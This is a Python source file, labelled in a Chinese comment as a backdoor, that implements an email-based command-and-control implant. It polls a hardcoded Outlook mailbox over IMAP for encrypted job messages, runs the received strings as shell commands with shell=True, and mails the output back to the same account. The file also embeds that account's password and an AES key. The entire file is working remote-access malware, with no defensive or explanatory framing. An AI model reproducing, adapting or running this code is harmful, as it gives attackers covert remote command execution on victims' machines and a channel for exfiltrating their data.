#-*- coding:utf8 -*-
#后们程序
import email
import imaplib
import base64
import string
import json
import random
import hashlib
import platform
import threading
import time
import subprocess

from smtplib import SMTP
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from Crypto.Cipher import AES
from Crypto import Random


##########################################
AESKEYS = 'this is a key lololo'
EMAIL_SERVER = 'smtp-mail.outlook.com'
IMA_EMAIL_SERVER = 'imap-mail.outlook.com'
EMAIL_PASSWORD = 'wangcai5388'
EMAIL_USERNAME = 'testforsiboer@hotmail.com'
SERVER_PORT = 587
EMAIL_TIME_OUT = 60

##########################################

clientid = hashlib.sha256('huangsibo lololo').hexdigest()
#siboer.py 中的·
class InfoSecury:

	def __init__(self):
		self.bs = 32
		self.key = hashlib.sha256(AESKEYS).digest()

	def encrypt(self,plaintext):
		raw = self._pad(plaintext)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(self.key,AES.MODE_CBC,iv)
		return base64.b64encode(iv + cipher.encrypt(raw))

	def decrypt(self,ciphertext):
		enc = base64.b64decode(ciphertext)
		iv = enc[:AES.block_size]
		enc =enc[AES.block_size:len(enc)]
		cipher = AES.new(self.key,AES.MODE_CBC,iv)
		return self._unpad(cipher.decrypt(enc)).decode('utf-8')

#填充字符 填充字符为 要填充的字符个数
	def _pad(self,s):
		return s + (self.bs - len(s) % self.bs)*chr(self.bs - len(s) % self.bs)
#unpad
	def _unpad(self, s):
		return s[:-ord(s[len(s)-1:])]

being_secure = InfoSecury()

class MessageParser:

	def __init__(self,msg_data):
		self.getDateHeader(msg_data)
		self.getSubjectHeader(msg_data)
		self.getPayloads(msg_data)

	def getPayloads(self,msg_data):
		payload = email.message_from_string(msg_data[1][0][1]).get_payload(None,True)
		data = being_secure.decrypt((payload))
		print data
		self.infodict =json.loads(data)

	def getSubjectHeader(self,msg_data):
		self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
	def getDateHeader(self,msg_data):
		self.date = email.message_from_string(msg_data[1][0][1])['Date']

class execCMD(threading.Thread):
	def __init__(self,command,jobid):
		threading.Thread.__init__(self)
		self.command = command
		self.jobid = jobid

	def run(self):
		proce = subprocess.Popen(self.command,shell=True,stderr=subprocess.PIPE,stdout=subprocess.PIPE\
			,stdin=subprocess.PIPE)
		stdout_result = proce.stdout.read()
		sendEmail({'cmd':self.command,'result':stdout_result},jobid=self.jobid)

class sendEmail(threading.Thread):
	def __init__(self,text,jobid='',checkin=False):
		threading.Thread.__init__(self)
		self.text = text
		self.jobid = jobid
		self.deamon = True
		self.checkin = checkin
		self.start()

	def run(self):
		sub_header=clientid
		if self.jobid:
			sub_header = 'Client:{} {}'.format(clientid,self.jobid)
		elif self.checkin:
			sub_header = 'This:{}'.format(clientid)

		msg = MIMEMultipart()
		msg['From'] = sub_header
		msg['To'] = EMAIL_USERNAME
		msg['Subject'] = sub_header
		msgtext = json.dumps(self.text)
		#print msgtext
		msg_str=being_secure.encrypt(json.dumps(msgtext))
		#print msg_str
		msg.attach(MIMEText(msg_str))


		smtpServer = SMTP()
		smtpServer.connect(EMAIL_SERVER,SERVER_PORT)
		smtpServer.starttls()
		smtpServer.login(EMAIL_USERNAME,EMAIL_PASSWORD)
		smtpServer.sendmail(EMAIL_USERNAME,EMAIL_USERNAME, msg.as_string())

		smtpServer.close()



#检查邮件， 检查在邮箱中排队的job， 分别解析和开启一个工作进程
#每隔60s 去检查一个新工作
def checkJobs():
	while True:
		rlink = imaplib.IMAP4_SSL(IMA_EMAIL_SERVER,993)
		rlink.login(EMAIL_USERNAME,EMAIL_PASSWORD)
		rlink.select('inbox')

		rcode,ids = rlink.search(None,'(UNSEEN SUBJECT "siboer:{}")'.format(clientid))
		for idm in ids[0].split():
			msg_data = rlink.fetch(idm,'(RFC822)')
			msg = MessageParser(msg_data)
			cmd = msg.infodict['cmd']
			args = msg.infodict['arg']
			print msg.subject
			jobid = msg.subject.split()[1]

			if cmd == 'execCMD':
				a = execCMD(args,jobid)
				a.start()

		time.sleep(5)



if __name__ == '__main__':
	sendEmail('test email',checkin=True)
	try:
		checkJobs()
	except KeyboardInterrupt:
		pass
	#execCMD('ls -a',12345).start()


